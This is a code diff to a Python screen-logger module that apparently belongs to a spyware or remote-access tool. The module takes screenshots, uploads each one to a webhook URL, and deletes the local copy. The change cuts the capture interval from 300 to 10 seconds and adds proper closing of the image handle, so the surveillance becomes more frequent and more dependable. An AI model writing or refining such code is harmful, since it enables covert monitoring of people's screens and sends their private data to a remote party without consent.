@@ -12,7 +12,7 @@ class ScreenLogger:
         self.log_file = os.path.join(
             get_logs_path(self.software_dir_name), "screen_log.png"
         )
-        self.interval = 300
+        self.interval = 10
 
     def log_screen(self):
         try:
@@ -21,6 +21,7 @@ class ScreenLogger:
             send_webhook(
                 self.webhook_url, file={"screen_logs.png": open(self.log_file, "rb")}
             )
+            screen.close()
             os.remove(self.log_file)
         except Exception as e:
             send_webhook(self.webhook_url, f"```❌ Error logging screen: {e}```")
